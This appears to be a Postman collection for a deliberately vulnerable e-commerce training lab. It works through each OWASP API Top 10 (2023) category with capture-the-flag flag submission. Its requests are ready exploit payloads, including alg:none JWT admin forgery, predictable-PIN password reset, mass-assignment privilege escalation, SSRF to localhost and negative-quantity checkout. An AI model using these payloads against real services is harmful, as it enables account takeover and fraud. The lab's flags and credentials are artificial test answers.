@@ -1,0 +1,413 @@
+{
+  "info": {
+    "name": "ShopVuln — OWASP API Security Top 10 (2023) Training Lab",
+    "_postman_id": "shopvuln-collection-2026",
+    "description": "Comprehensive Postman collection for testing and exploiting ShopVuln OWASP API Top 10 scenarios.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "0. Lab Controls & System",
+      "item": [
+        {
+          "name": "Health Check",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/health"
+          }
+        },
+        {
+          "name": "Reset Lab Database",
+          "request": {
+            "method": "POST",
+            "url": "{{baseUrl}}/lab/reset"
+          }
+        },
+        {
+          "name": "View CTF Scoreboard",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/lab/scoreboard"
+          }
+        },
+        {
+          "name": "Submit Flag",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"flag_code\": \"FLAG{API1_BOLA_ORDER_DATA_EXPOSED_9182}\"\n}"
+            },
+            "url": "{{baseUrl}}/lab/flags/submit"
+          }
+        },
+        {
+          "name": "Get Category Hint (API1)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/lab/hints/API1"
+          }
+        }
+      ]
+    },
+    {
+      "name": "1. Authentication",
+      "item": [
+        {
+          "name": "Login Alice (Customer)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "if (jsonData.access_token) {",
+                  "    pm.environment.set('aliceToken', jsonData.access_token);",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"alice\",\n  \"password\": \"Password123!\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/auth/login"
+          }
+        },
+        {
+          "name": "Login Bob (Customer)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "if (jsonData.access_token) {",
+                  "    pm.environment.set('bobToken', jsonData.access_token);",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"bob\",\n  \"password\": \"Password123!\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/auth/login"
+          }
+        },
+        {
+          "name": "Login Admin",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "if (jsonData.access_token) {",
+                  "    pm.environment.set('adminToken', jsonData.access_token);",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"admin\",\n  \"password\": \"AdminSecret2026!\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/auth/login"
+          }
+        },
+        {
+          "name": "Get Authenticated Profile (/me)",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "Authorization", "value": "Bearer {{aliceToken}}"}],
+            "url": "{{baseUrl}}/api/v1/auth/me"
+          }
+        }
+      ]
+    },
+    {
+      "name": "2. API1: Broken Object Level Authorization (BOLA)",
+      "item": [
+        {
+          "name": "BOLA Order Access (Bob requests Alice's Order 1)",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "Authorization", "value": "Bearer {{bobToken}}"}],
+            "url": "{{baseUrl}}/api/v1/orders/1"
+          }
+        },
+        {
+          "name": "BOLA Return Request Access (Bob requests Alice's Return 1)",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "Authorization", "value": "Bearer {{bobToken}}"}],
+            "url": "{{baseUrl}}/api/v1/returns/1"
+          }
+        }
+      ]
+    },
+    {
+      "name": "3. API2: Broken Authentication",
+      "item": [
+        {
+          "name": "Session Exchange (Unsigned alg:none Token Forgery)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"token\": \"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI1IiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/auth/session-exchange"
+          }
+        },
+        {
+          "name": "Forgot Password (Predictable PIN Request)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username_or_email\": \"charlie\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/auth/forgot-password"
+          }
+        },
+        {
+          "name": "Reset Password (With Predictable PIN)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username_or_email\": \"charlie\",\n  \"reset_token\": \"3333\",\n  \"new_password\": \"HackedCharliePassword123!\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/auth/reset-password"
+          }
+        }
+      ]
+    },
+    {
+      "name": "4. API3: BOPLA",
+      "item": [
+        {
+          "name": "Mass Assignment Profile Privilege Escalation",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{bobToken}}"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"role\": \"admin\",\n  \"balance\": 999999.0\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/users/profile"
+          }
+        },
+        {
+          "name": "Excessive Property Exposure (User Object Leak)",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "Authorization", "value": "Bearer {{bobToken}}"}],
+            "url": "{{baseUrl}}/api/v1/users/1"
+          }
+        }
+      ]
+    },
+    {
+      "name": "5. API4: Unrestricted Resource Consumption",
+      "item": [
+        {
+          "name": "Unbounded Pagination DoS (limit=1000)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/v1/products?limit=1000"
+          }
+        },
+        {
+          "name": "Unrestricted Batch Cart Add Burst",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{aliceToken}}"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"items\": [\n    {\"product_id\": 1, \"quantity\": 999999}\n  ]\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/cart/batch-add"
+          }
+        }
+      ]
+    },
+    {
+      "name": "6. API5: Broken Function Level Authorization (BFLA)",
+      "item": [
+        {
+          "name": "Administrative User Export (Invoked as Customer Alice)",
+          "request": {
+            "method": "GET",
+            "header": [{"key": "Authorization", "value": "Bearer {{aliceToken}}"}],
+            "url": "{{baseUrl}}/api/v1/admin/export-users"
+          }
+        },
+        {
+          "name": "Seller Product Price Tampering (Invoked as Customer Alice)",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{aliceToken}}"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"price\": 0.99\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/products/1/price"
+          }
+        }
+      ]
+    },
+    {
+      "name": "7. API6: Sensitive Business Flows",
+      "item": [
+        {
+          "name": "Coupon Code Replay / Stacking",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{aliceToken}}"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"coupon_code\": \"DEVTEST100\",\n  \"cart_total\": 500.0\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/checkout/apply-coupon"
+          }
+        },
+        {
+          "name": "Negative Quantity Checkout Manipulation",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{aliceToken}}"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"items\": [\n    {\"product_id\": 1, \"quantity\": -5}\n  ],\n  \"shipping_address\": \"100 Business Exploit Way\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/checkout/process-order"
+          }
+        }
+      ]
+    },
+    {
+      "name": "8. API7: Server-Side Request Forgery (SSRF)",
+      "item": [
+        {
+          "name": "SSRF to Mock Internal Partner Admin Metrics",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Authorization", "value": "Bearer {{aliceToken}}"},
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"order_id\": 1,\n  \"partner_label_url\": \"http://127.0.0.1:9000/internal/admin/system-metrics\"\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/shipping/fetch-label-preview"
+          }
+        }
+      ]
+    },
+    {
+      "name": "9. API8: Security Misconfiguration",
+      "item": [
+        {
+          "name": "Exposed Debug Environment Diagnostics",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/v1/system/debug-info"
+          }
+        },
+        {
+          "name": "Check Security Headers",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/v1/system/headers-check"
+          }
+        }
+      ]
+    },
+    {
+      "name": "10. API9: Improper Inventory Management",
+      "item": [
+        {
+          "name": "Query Undocumented Legacy Route (Hidden Product 16)",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/v1_legacy/products/hidden"
+          }
+        },
+        {
+          "name": "Query Undocumented Shadow Inventory Audit",
+          "request": {
+            "method": "GET",
+            "url": "{{baseUrl}}/api/inventory/internal-audit"
+          }
+        }
+      ]
+    },
+    {
+      "name": "11. API10: Unsafe Consumption of APIs",
+      "item": [
+        {
+          "name": "Untrusted Courier Webhook Ingestion (Balance Override)",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"order_id\": 1,\n  \"status\": \"delivered\",\n  \"override_refund_amount\": 1000.0\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/webhooks/shipping-update"
+          }
+        },
+        {
+          "name": "Negative Exchange Rate Injection",
+          "request": {
+            "method": "POST",
+            "header": [{"key": "Content-Type", "value": "application/json"}],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"amount_usd\": 100.0,\n  \"target_currency\": \"EUR\",\n  \"partner_rate_payload\": {\"exchange_rate\": -2.5}\n}"
+            },
+            "url": "{{baseUrl}}/api/v1/checkout/calculate-currency"
+          }
+        }
+      ]
+    }
+  ]
+}
